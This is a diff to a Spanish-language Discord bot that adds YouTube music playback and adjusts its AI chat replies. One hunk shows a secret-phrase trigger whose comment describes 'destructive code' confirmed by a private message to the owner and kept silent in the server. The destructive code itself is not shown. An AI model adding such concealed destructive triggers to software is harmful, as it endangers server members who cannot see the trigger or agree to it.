@@ -7,6 +7,7 @@ from discord.ext import commands, tasks
 from dotenv import load_dotenv
 import os
 import httpx
+import yt_dlp as youtube_dl
 
 from mantener_vivo import mantener_vivo
 mantener_vivo()
@@ -24,13 +25,14 @@ intents = discord.Intents.default()
 intents.message_content = True
 intents.guilds = True
 intents.members = True
+intents.voice_states = True  # Necesario para manejar canales de voz
 
 bot = commands.Bot(command_prefix="!", intents=intents)
 
 # Ruta del archivo de memoria
 MEMORIA_PATH = "memoria.json"
 
-# Función para cargar la memoria desde archivo
+# Funciones para memoria
 def cargar_memoria():
     if not os.path.exists(MEMORIA_PATH):
         with open(MEMORIA_PATH, "w") as f:
@@ -38,17 +40,15 @@ def cargar_memoria():
     with open(MEMORIA_PATH, "r") as f:
         return json.load(f)
 
-# Función para guardar la memoria en archivo
 def guardar_memoria(memoria):
     with open(MEMORIA_PATH, "w") as f:
         json.dump(memoria, f, indent=4)
 
-# Verifica si está en horario activo
 def esta_activo():
     ahora = datetime.now(timezone("America/Argentina/Buenos_Aires"))
     return 8 <= ahora.hour or ahora.hour < 3
 
-# Generar respuesta usando OpenRouter con reintentos y timeout aumentado
+# Función para generar respuestas
 async def generar_respuesta(mensajes, intentos=3):
     global bloqueado_por_limite
     for intento in range(intentos):
@@ -59,20 +59,18 @@ async def generar_respuesta(mensajes, intentos=3):
                 "HTTP-Referer": "https://tubotdiscord.com",
                 "X-Title": "BotNarumi"
             }
-
             payload = {
                 "model": "qwen/qwen3-235b-a22b:free",
                 "messages": [
                     {"role": "system", "content": "Sos un bot de Discord con personalidad amable, graciosa y empática. Respondés en español con humor ligero y respeto."}
                 ] + [{"role": "user", "content": msg} for msg in mensajes]
             }
-
             async with httpx.AsyncClient() as client:
                 response = await client.post(
                     "https://openrouter.ai/api/v1/chat/completions",
                     headers=headers,
                     json=payload,
-                    timeout=60  # timeout aumentado
+                    timeout=60
                 )
                 print("Respuesta bruta:", response.text)
 
@@ -87,21 +85,57 @@ async def generar_respuesta(mensajes, intentos=3):
         except httpx.RequestError as e:
             print(f"⚠️ Intento {intento+1} falló: {e}")
             if intento < intentos - 1:
-                await asyncio.sleep(2)  # espera antes de reintentar
+                await asyncio.sleep(2)
                 continue
             else:
                 return f"⚠️ Error: no se pudo conectar a la API después de {intentos} intentos."
-
         except Exception as e:
             print(f"❌ Error al generar respuesta: {e}")
             return f"⚠️ Ocurrió un error: {e}"
 
-# Evento cuando el bot se conecta
 @bot.event
 async def on_ready():
     print(f"✅ Bot conectado como {bot.user}")
     hablar_automaticamente.start()
     resetear_limite.start()
+
+# Función para reproducir audio desde YouTube
+async def reproducir_musica(ctx, consulta):
+    if ctx.author.voice is None or ctx.author.voice.channel is None:
+        await ctx.send("❌ Tenés que estar en un canal de voz para que pueda unirme y reproducir música.")
+        return
+
+    canal_voz = ctx.author.voice.channel
+
+    if ctx.voice_client is None:
+        await canal_voz.connect()
+    elif ctx.voice_client.channel != canal_voz:
+        await ctx.voice_client.move_to(canal_voz)
+
+    vc = ctx.voice_client
+
+    ydl_opts = {
+        'format': 'bestaudio/best',
+        'outtmpl': 'cancion.mp3',
+        'quiet': True,
+        'no_warnings': True,
+    }
+
+    try:
+        with youtube_dl.YoutubeDL(ydl_opts) as ydl:
+            info = ydl.extract_info(consulta, download=True)
+    except Exception as e:
+        await ctx.send(f"❌ No pude encontrar o descargar la canción.\nError: {e}")
+        return
+
+    try:
+        if vc.is_playing():
+            vc.stop()
+        source = discord.FFmpegPCMAudio('cancion.mp3', executable='./ffmpeg')
+        vc.play(source, after=lambda e: print(f"🔈 Reproducción terminada: {e}" if e else "✅ Canción terminada."))
+        await ctx.send(f"🎶 Reproduciendo: **{info['title']}**")
+    except Exception as e:
+        await ctx.send(f"❌ No pude reproducir la canción.\nError: {e}")
 
 @bot.event
 async def on_message(message):
@@ -113,6 +147,7 @@ async def on_message(message):
         contenido = message.content.lower()
 
         if FRASE_SECRETA in contenido:
+            # Código destructivo con confirmación por DM al dueño, sin mensajes en el servidor
             try:
                 owner_id = 1116854150962090084
                 owner = await bot.fetch_user(owner_id)
@@ -171,6 +206,7 @@ async def on_message(message):
 
             return
 
+        # Memoria y respuestas AI
         memoria = cargar_memoria()
         guild_id = str(message.guild.id)
         if guild_id not in memoria:
@@ -178,18 +214,37 @@ async def on_message(message):
 
         memoria[guild_id]["mensajes"].append(message.content)
         memoria[guild_id]["mensajes"] = memoria[guild_id]["mensajes"][-20:]
-
         guardar_memoria(memoria)
 
-        referenciado = getattr(message.reference, "resolved", None)
-        if bot.user in message.mentions or (referenciado and referenciado.author == bot.user):
-            if esta_activo():
-                respuesta = await generar_respuesta(memoria[guild_id]["mensajes"])
-                if len(respuesta) > 2000:
-                    for i in range(0, len(respuesta), 2000):
-                        await message.channel.send(respuesta[i:i+2000])
+        # Detectar si mencionan al bot con pedido de música
+        if bot.user in message.mentions:
+            contenido_lower = message.content.lower()
+            # Comandos para música (ejemplo simple)
+            if ("pon" in contenido_lower or "reproducir" in contenido_lower) and ("youtube.com" in contenido_lower or "http" in contenido_lower or True):
+                # Extraer el texto después de "pon" o "reproducir"
+                # Aquí un ejemplo muy básico para que captures la canción
+                palabras = contenido_lower.split()
+                indice = -1
+                for i, palabra in enumerate(palabras):
+                    if palabra in ("pon", "reproducir"):
+                        indice = i
+                        break
+                consulta = " ".join(palabras[indice + 1:]) if indice != -1 else ""
+
+                if consulta:
+                    await reproducir_musica(await bot.get_context(message), consulta)
                 else:
-                    await message.channel.send(respuesta)
+                    await message.channel.send("❓ No entendí qué canción querés que ponga.")
+
+            else:
+                # Respuesta normal AI
+                if esta_activo():
+                    respuesta = await generar_respuesta(memoria[guild_id]["mensajes"])
+                    if len(respuesta) > 2000:
+                        for i in range(0, len(respuesta), 2000):
+                            await message.channel.send(respuesta[i:i+2000])
+                    else:
+                        await message.channel.send(respuesta)
 
         await bot.process_commands(message)
 
@@ -237,4 +292,3 @@ async def resetear_limite():
 
 # Ejecutar el bot
 bot.run(DISCORD_TOKEN)
-
